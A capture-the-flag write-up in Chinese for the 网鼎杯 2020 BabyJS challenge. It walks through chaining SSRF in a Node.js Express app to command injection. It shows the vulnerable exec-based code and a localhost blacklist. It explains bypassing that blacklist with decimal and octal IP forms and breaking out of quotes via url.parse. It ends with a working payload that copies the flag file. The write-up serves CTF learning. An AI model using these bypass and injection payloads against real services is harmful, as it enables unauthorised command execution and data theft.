---
title: '[网鼎杯 2020 半决赛]BabyJS'
date: 2024-11-20 21:45:08
tags: 
      - ssrf
      - nodejs
categories: 刷题笔记
---

## [网鼎杯 2020 半决赛]BabyJS

题目的关键代码如下

```js
var express = require('express');
var config = require('../config');
var url=require('url');
var child_process=require('child_process');
var fs=require('fs');
var request=require('request');
var router = express.Router();


var blacklist=['127.0.0.1.xip.io','::ffff:127.0.0.1','127.0.0.1','0','localhost','0.0.0.0','[::1]','::1'];

router.get('/', function(req, res, next) {
    res.json({});
});

router.get('/debug', function(req, res, next) {
    console.log(req.ip);
    if(blacklist.indexOf(req.ip)!=-1){
        console.log('res');
	var u=req.query.url.replace(/[\"\']/ig,'');
	console.log(url.parse(u).href);
	let log=`echo  '${url.parse(u).href}'>>/tmp/log`;
	console.log(log);
	child_process.exec(log);
	res.json({data:fs.readFileSync('/tmp/log').toString()});
    }else{
        res.json({});
    }
});


router.post('/debug', function(req, res, next) {
    console.log(req.body);
    if(req.body.url !== undefined) {
        var u = req.body.url;
	var urlObject=url.parse(u);
	if(blacklist.indexOf(urlObject.hostname) == -1){
		var dest=urlObject.href;
		request(dest,(err,result,body)=>{
			res.json(body);
		})
	}
	else{
		res.json([]);
	}
	}
});

module.exports = router;
```



实现GET方法在debug路由中，这存在可控的命令执行，但需要rep.ip为黑名单的ip，那么就可以确定这是一道SSRF的题目看，然后看post或者debug路由，可知这道题的解题方法应该是通过POST访问debug路由，传递url参数，使url参数经过url.parse()处理后对应的hostname不在黑名单里，然后调用request()去访问url.parse处理后的href，这里由于黑名单过滤不全，可以通过`http://2130706433/`、`http://0177.0.0.01/`等方式绕过；之后就是要闭合单引号，执行多条命令了，经过测试发现，在`@`符号之前输入`%27`，会经过url解码变成单引号，如下                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             

```js
var url=require('url');

var request=require('request');
var u = "http://aaa%27@:8000%27qq.com";

urlObject=url.parse(u);
console.log(urlObject);

/*
Url {
  protocol: 'http:',
  slashes: true,
  auth: 'aaa\'',
  host: ':8000',
  port: '8000',
  hostname: '',
  hash: null,
  search: null,
  query: null,
  pathname: '%27qq.com',
  path: '%27qq.com',
  href: 'http://aaa\'@:8000/%27qq.com' }
  */
```

之后就是执行命令了，但是没有回显，可以尝试将`flag`写入文件中，经过测试发现`>`、`}`和空格符等字符都会被编码，就不能利用`cat`和`>`来写入文件了，所以最后利用`cp`将`flag`复制到`/tmp/log/`中，然后直接就可以直接读FLAG了。

```
url=http://2130706433/debug?url=http://%2527@1;cp$IFS$9/flag$IFS$9/tmp/log;%23
```

![image-20241121204431655](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411212044829.png)

参考：

https://blog.csdn.net/qq_33917045/article/details/110306993

https://blog.csdn.net/qq_53755216/article/details/119332974

http://47.96.173.116/2021/10/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9Bbabyjs/
